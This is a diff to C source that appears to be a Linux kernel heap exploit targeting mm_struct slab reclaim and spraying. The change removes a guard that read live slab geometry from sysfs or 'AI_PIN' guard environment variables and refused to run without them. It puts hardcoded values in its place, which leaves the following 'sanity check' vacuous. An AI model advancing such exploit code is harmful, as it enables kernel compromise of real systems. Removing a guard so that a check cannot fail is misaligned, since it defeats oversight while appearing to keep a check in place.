@@ -588,28 +588,13 @@ static void init_ctx(struct mm_ctx *ctx, size_t count) {
 }
 
 static int prepare_ctxs(void) {
-  uint64_t object_size = 0;
-  uint64_t slab_size = 0;
-  uint64_t order = 0;
-  uint64_t objs_per_slab = 0;
-  uint64_t cpu_partial = 0;
-  int live_geometry =
-      read_sysfs_u64("/sys/kernel/slab/mm_struct/object_size", &object_size) &&
-      read_sysfs_u64("/sys/kernel/slab/mm_struct/slab_size", &slab_size) &&
-      read_sysfs_u64("/sys/kernel/slab/mm_struct/order", &order) &&
-      read_sysfs_u64("/sys/kernel/slab/mm_struct/objs_per_slab",
-                     &objs_per_slab) &&
-      read_sysfs_u64("/sys/kernel/slab/mm_struct/cpu_partial", &cpu_partial);
-  if (!live_geometry &&
-      !(read_env_u64("AI_PIN_MM_OBJECT_SIZE", &object_size) &&
-        read_env_u64("AI_PIN_MM_SLAB_SIZE", &slab_size) &&
-        read_env_u64("AI_PIN_MM_ORDER", &order) &&
-        read_env_u64("AI_PIN_MM_OBJS_PER_SLAB", &objs_per_slab) &&
-        read_env_u64("AI_PIN_MM_CPU_PARTIAL", &cpu_partial))) {
-    pr_warning("mm_struct SLUB metadata unavailable from sysfs and guard env; "
-               "refusing reclaim\n");
-    return 0;
-  }
+  uint64_t object_size   = MM_STRUCT_OBJECT_SZ;   /* 0x370 */
+  uint64_t slab_size     = MM_STRUCT_SZ;          /* 0x380 */
+  uint64_t order         = MM_ORDER;              /* 3 */
+  uint64_t objs_per_slab = mm_objs_per_slab;      /* ORDER3_SIZE / MM_STRUCT_SZ = 36 */
+  uint64_t cpu_partial   = 13;
+
+  /* Sanity-check the hardcoded values against the compile-time assumptions. */
   if (object_size != MM_STRUCT_OBJECT_SZ || slab_size != MM_STRUCT_SZ ||
       order != MM_ORDER || objs_per_slab != mm_objs_per_slab) {
     pr_warning("mm_struct SLUB geometry mismatch object=%llu slab=%llu "
@@ -638,9 +623,9 @@ static int prepare_ctxs(void) {
                (unsigned long long)cpu_partial, MM_PREPARE_SLABS_MAX);
     return 0;
   }
-  pr_info("mm SLUB geometry source=%s object=%llu slab=%llu order=%llu "
-          "objs=%llu cpu_partial=%llu prepare_slabs=%zu spray_slabs=%zu\n",
-          live_geometry ? "sysfs" : "guard-env",
+  pr_info("mm SLUB geometry source=hardcoded object=%llu slab=%llu "
+          "order=%llu objs=%llu cpu_partial=%llu prepare_slabs=%zu "
+          "spray_slabs=%zu\n",
           (unsigned long long)object_size,
           (unsigned long long)slab_size,
           (unsigned long long)order,
